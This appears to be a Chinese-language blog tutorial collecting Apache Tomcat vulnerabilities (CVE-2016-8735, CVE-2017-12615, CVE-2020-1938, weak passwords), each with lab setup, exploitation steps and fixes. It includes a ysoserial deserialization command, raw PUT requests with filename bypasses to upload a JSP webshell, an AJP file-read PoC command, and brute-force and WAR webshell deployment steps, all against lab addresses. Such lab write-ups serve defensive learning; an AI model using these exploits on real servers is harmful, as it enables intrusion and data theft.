---
title: Tomcat漏洞汇总
date: 2020-08-13 17:38:54
---

### 介绍

Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。

### 环境搭建

```
Java环境安装
https://www.java.com/en/download/manual.jsp
Tomcat
https://tomcat.apache.org/download-70.cgi
以下部分漏洞环境可参考github每个漏洞介绍及实战都已提供。
```

1、下载并解压

<img src="/images/tomcat/image-20200811143320510.png" alt="image-20200811143320510" style="zoom:50%;" />

2、双击执行启动服务

```
http://192.168.3.156:8080/
```

![image-20200811143448762](/images/tomcat/image-20200811143448762.png)

#### Tomcat结构介绍

下载解压后存在目录、文件信息：

```shell
bin-----存放Tomcat的脚本文件，例如启动、关闭
conf----Tomcat的配置文件，例如server.xml和web.xml
lib-----存放Tomcat运行需要的库文件（JAR包）
logs----存放Tomcat执行时的LOG文件
temp----存放Tomcat运行时所产生的临时文件
webapps-Web发布目录，默认情况下把Web应用文件放于此目录
work----存放jsp编译后产生的class文件
```

### 漏洞分类实战

#### CVE-2016-8735

##### 漏洞描述

Oracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。

##### 影响范围

Apache Tomcat 9.0.0.M1 to 9.0.0.M11 

Apache Tomcat 8.5.0 to 8.5.6 

Apache Tomcat 8.0.0.RC1 to 8.0.38 

Apache Tomcat 7.0.0 to 7.0.72 

Apache Tomcat 6.0.0 to 6.0.47

##### 漏洞原理

该漏洞的诱因存在于Oracle已经修复的JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。因为Tomcat也使用了JmxRemoteLifecycleListener监听功能，但并没有及时升级，导致该远程代码执行漏洞。

##### 漏洞条件

1、要外部开启JmxRemoteLifecycleListener监听端口，实现远程利用。 

```xml
conf/server.xml
<Listener className="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" rmiRegistryPortPlatform="10001" rmiServerPortPlatform="10002" />
```

![image-20200812101526860](/images/tomcat/image-20200812101526860.png)

2、下载对应jar放到lib目录下：

- catalina-jmx-remote.jar要与对应tomcat版本一致[不同版本下载](https://archive.apache.org/dist/tomcat/)一般存在extras文件下，如下图所示
- [groovy2.3.9](https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9)下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）

![image-20200812102130773](/images/tomcat/image-20200812102130773.png)

![image-20200811163431177](/images/tomcat/image-20200811163431177.png)

3、接着修改bin/catalina.bat，在Execute The Requested Command处上面添加

```java
set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false
```

- -Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯
- -Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证

![image-20200812101910590](/images/tomcat/image-20200812101910590.png)

4、服务启动

下图所示：服务已启动10001端口已启动

![image-20200812103050881](/images/tomcat/image-20200812103050881.png)

##### 漏洞检测

1、执行以下PoC

```java
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.165 10001 Groovy1 calc.exe
```

Java 1.8出现报错

![image-20200812104703039](/images/tomcat/image-20200812104703039.png)

1.7的jdk成功弹出计算器

![PoC](/images/tomcat/PoC.gif)

##### 漏洞修复

紧急措施：关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。同时，增加严格的认证方式。

升级jdk（目前测试1.8是无法利用）

推荐方案：官方已经发布了版本更新，建议您升级到最新版本。

- Apache Tomcat 9.0.0.M13或更新版本(Apache Tomcat 9.0.0.M12也修复了此漏洞，但并未发布)

- Apache Tomcat 8.5.8或更新版本(Apache Tomcat 8.5.7也修复了此漏洞，但并未发布)

- Apache Tomcat 8.0.39或更新版本

- Apache Tomcat 7.0.73或更新版本

- Apache Tomcat 6.0.48或更新版本

  

#### CVE-2017-12615

##### 漏洞描述

远程代码执行漏洞(CVE-2017-12615)。当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。

##### 影响范围

Apache Tomcat 7.0.0 – 7.0.79

##### 漏洞原理

启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）,可任意上传恶意文件至服务器端

默认`readonly`为`true`，也就是无法进行PUT、DELETE行为

````
conf/web.xml		//文件内容
````

![image-20200813095843352](/images/tomcat/image-20200813095843352.png)

这个CVE漏洞涉及到 DefaultServlet，DefaultServlet作用是处理静态文件，同时DefaultServlet可以处理PUT或DELETE请求，默认配置如图2：

![image-20200813100218371](/images/tomcat/image-20200813100218371.png)

可以看出即使设置readonly为false,默认tomcat也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。

绕过方式：

Windows：
1、利用/shell.jsp::$DATA的方式绕过
2、/shell.jsp%20，空格绕过
3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/
Linux：
1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/

##### 漏洞条件

`readonly`设置为`false`时会导致攻击者上传任意恶意文件。

##### 漏洞检测

漏洞环境使用[P牛docker](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615)镜像验证。

Tomcat version: 8.5.19

![image-20200813140738965](/images/tomcat/image-20200813140738965.png)

将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。修改部分如下。

1、readonly默认值为true，手动将其改为false，在`conf/web.xml`中手动添加红色方框类内容。

添加如下：

```xml
				<init-param> 
            <param-name>readonly</param-name> 
            <param-value>false</param-value> 
        </init-param>
```

![image-20200813100605923](/images/tomcat/image-20200813100605923.png)

2、修改请求头并传递post数据

```
PUT /shell.jsp HTTP/1.1
Host: 192.168.3.49:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 5

shell
```

![image-20200813131648712](/images/tomcat/image-20200813131648712.png)

由上图看到提示404，说明JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。会被过滤掉。

此时可以利用上面介绍的绕过方式

利用文件解析漏洞采用PUT方式上传jsp webshell文件。其中文件名设为/shell.jsp/。（如果文件名后缀是空格那么将会被tomcat给过滤掉。）

```
PUT /shell.jsp/ HTTP/1.1
Host: 192.168.3.49:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 5

shell
```

下图所示修改shell.jsp/即可上传成功

![image-20200813131744168](/images/tomcat/image-20200813131744168.png)

文件访问

![image-20200813133423171](/images/tomcat/image-20200813133423171.png)

shell管理

![image-20200813134428832](/images/tomcat/image-20200813134428832.png)

##### 漏洞修复

1、删除web.xml文件中readonly属性的值为true或直接删除

2、更新至官方最新

#### CVE-2020-1938

##### 漏洞描述

CVE-2020-1938是由于Apache Tomcat服务器存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件或源代码等。

由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。

##### 影响范围

Apache Tomcat 6

Apache Tomcat 7 < 7.0.100

Apache Tomcat 8 < 8.5.51

Apache Tomcat 9 < 9.0.31

##### 漏洞原理

由于Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。

##### 漏洞条件

无条件（漏洞环境[参考](https://github.com/0nise/CVE-2020-1938)zip解压并执行）

##### 漏洞检测

1、URL访问

```
http://192.168.3.167:8080/
```

![image-20200813153350723](/images/tomcat/image-20200813153350723.png)

2、端口号检测

![image-20200813153640165](/images/tomcat/image-20200813153640165.png)

由上可以知道目标主机开放8009端口号。

3、PoC读取文件

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.3.167 -p 8009 -f WEB-INF/web.xml
```

![image-20200813153702055](/images/tomcat/image-20200813153702055.png)

##### 漏洞修复

1、下载最新

```
https://tomcat.apache.org/download-70.cgi
https://tomcat.apache.org/download-80.cgi
https://tomcat.apache.org/download-90.cgi
https://github.com/apache/tomcat/releases
```

2、临时禁用AJP协议端口，

在conf/server.xml

`注释此行<Connector port="8009" protocol="AJP/1.3"redirectPort="8443" />`

![image-20200813154014736](/images/tomcat/image-20200813154014736.png)

#### Weak password

##### 漏洞描述

弱口令属于常见漏洞，也是在漏洞挖掘时一个很好的突破口；而tomcat如果存在弱口令，那将会影响系统被攻击者获取系统权限。

##### 影响范围

所有版本

##### 漏洞原理

口令设置较弱，可直接爆破。

```xml
conf/tomcat-users.xml(添加一行即可)
<user username="tomcat" password="tomcat" roles="manager-status,manager-gui,manager-script,manager-jmx"/>
```

##### 漏洞条件

无条件

##### 漏洞检测

1、URL访问

```
http://192.168.3.167:8080/
```

![image-20200813163502206](/images/tomcat/image-20200813163502206.png)

2、点击“Server Status”

![image-20200813163542988](/images/tomcat/image-20200813163542988.png)

3、尝试爆破

[脚本](https://github.com/magicming200/tomcat-weak-password-scanner)

![image-20200813163718308](/images/tomcat/image-20200813163718308.png)

4、生成war包

```shell
➜  server jar -cvf  shell.war shell.jsp
```

![image-20200813163839974](/images/tomcat/image-20200813163839974.png)

5、部署war包

![image-20200813164753751](/images/tomcat/image-20200813164753751.png)

6、访问

```
http://192.168.3.167:8080/shell/shell.jsp
```

![image-20200813164812341](/images/tomcat/image-20200813164812341.png)

![image-20200813164838466](/images/tomcat/image-20200813164838466.png)

##### 漏洞修复

1、设置强壮密码

2、平时不用，不允许登录

### Tools

[Weak_password_brute](https://github.com/si1ent-le/vuln-all/tree/master/Tomcat_vuln/weakpassword/tomcat_weakpassword_brute)

[CVE-2020-1938](https://github.com/si1ent-le/vuln-all/blob/master/Tomcat_vuln/CVE-2020-1938/CNVD-2020-10487-Tomcat-Ajp-lfi.py)

### 参考

```
https://github.com/vulhub/vulhub/tree/master/tomcat
https://xz.aliyun.com/t/5610
https://github.com/0nise/CVE-2020-1938
```

